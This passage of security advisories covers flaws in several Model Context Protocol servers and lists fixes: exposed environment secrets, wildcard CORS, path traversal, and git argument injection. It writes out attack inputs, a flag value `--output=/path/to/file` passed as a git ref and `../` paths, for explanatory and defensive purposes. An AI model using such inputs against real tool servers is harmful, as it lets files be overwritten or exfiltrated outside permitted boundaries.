- VS Code Docker install (`mcp/everything`) uses stdio — not affected
- `npx @modelcontextprotocol/server-everything sse` — directly affected

---
## Recommended Fixes

### Immediate (the server should not be run as-is)

1. **Bind to loopback only**:
   ```typescript
   app.listen(PORT, "127.0.0.1", () => { ... });
   ```

2. **Replace wildcard CORS with localhost-only**:
   ```typescript
   cors({ origin: /^https?:\/\/localhost(:\d+)?$/ })
   ```

3. **Remove or gate `get-env`** behind an explicit opt-in flag:
   ```typescript
   if (process.env.ENABLE_GET_ENV_TOOL === "true") {
     registerGetEnvTool(server);
   }
   ```

4. **Add auth token** to HTTP transports (bearer token generated at startup, logged to console).

### Long-term

- Add a security warning to the README before the HTTP transport usage instructions
- Document that `get-env` exposes all process secrets and should never be run in shared or multi-user environments
- Publish a fixed version to npm

## Earlier versions

Releases before 2025.9.24 did not send permissive CORS headers, so a web page could not read tool results cross-origin. They still checked neither `Origin` nor `Host`, so they remain exposed to DNS rebinding, which the `Origin` check in 2.0.1 also closes. Upgrade from any earlier version.

## Upgrading from a date-versioned release

`@modelcontextprotocol/server-everything` moved from date versions (2025.x, 2026.x) to semantic versions in 1.0.0. Package managers rank 2.0.1 below every 2025.x and 2026.x version, so they will not offer it as an upgrade and Dependabot will not open one. If you are on a date version, install the fix explicitly: `npm install @modelcontextprotocol/server-everything@2.0.1` (or `@latest`).

summary: Path traversal in git_add allows staging files outside repository boundaries in mcp-server-git
description:
In `mcp-server-git` versions prior to 2026.1.14, the `git_add` tool did not validate that file paths provided in the files argument were within the repository boundaries. The tool used GitPython's `repo.index.add(`, which did not enforce working-tree boundary checks for relative paths. As a result, relative paths containing `../` sequences that resolved outside the repository were accepted and staged into the Git index, potentially allowing sensitive files to be exfiltrated via subsequent commit and push operations. The fix in PR #3164 switches to `repo.git.add()`, which delegates to the Git CLI and properly rejects out-of-tree paths. Users are advised to upgrade to 2026.1.14 or newer to remediate this issue.

Thank you to https://hackerone.com/0dd-g for reporting and contributing the fix.

cwes.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

summary: Unrestricted git_init tool allows repository creation at arbitrary filesystem locations in mcp-server-git
description:
In mcp-server-git versions prior to 2025.9.25, the git_init tool accepted arbitrary filesystem paths and created Git repositories without validating the target location. Unlike other tools which required an existing repository, git_init could operate on any directory accessible to the server process, making those directories eligible for subsequent git operations. The tool was removed entirely, as the server is intended to operate on existing repositories only. Users are advised to upgrade to 2025.9.25 or newer to remediate this issue.

Thank you to https://hackerone.com/yardenporat for disclosure, @0dd for contributing the fix.

summary: Argument injection in git_diff and git_checkout functions for mcp-server-git allows overwriting local files
description:
In mcp-server-git versions prior to 2025.12.18, the git_diff and git_checkout functions passed user-controlled arguments directly to git CLI commands without sanitization. Flag-like values (e.g., `--output=/path/to/file` for `git_diff`) would be interpreted as command-line options rather than git refs, enabling arbitrary file overwrites. The fix adds validation that rejects arguments starting with - and verifies the argument resolves to a valid git ref via rev_parse before execution. Users are advised to update to 2025.12.18 resolve this issue.

Thank you to https://hackerone.com/yardenporat for reporting.

cwes.name: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')

summary: Missing path validation when using --repository flag in mcp-server-git
description:
In mcp-server-git versions prior to 2025.12.18, when the server is started with the --repository flag to restrict operations to a specific repository path, it did not validate that repo_path arguments in subsequent tool calls were actually within that configured path. This could allow tool calls to operate on other repositories accessible to the server process. The fix adds path validation that resolves both the configured repository and the requested path (following symlinks) and verifies the requested path is within the allowed repository before executing any git operations. Users are advised to upgrade to 2025.12.18 to remediate this issue.

Thank you to https://hackerone.com/yardenporat for reporting.

cwes.name: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

summary: Path validation bypass via colliding path prefix
description:
Versions of Filesystem prior to 0.6.3 & 2025.3.28 could allow access to unintended files in cases where the prefix matches an allowed directory. Users are advised to upgrade to 0.6.4 or 2025.7.01 resolve.

Thank you to Elad Beber (Cymulate) for reporting these issues.

summary: Path validation bypass via symlink handling
description:
Versions of Filesystem prior to 0.6.3 & 2025.3.28 could allow access to unintended files via symlinks within allowed directories. Users are advised to upgrade to 0.6.4 or 2025.7.01 resolve.

Thank you to Elad Beber (Cymulate) for reporting these issues.
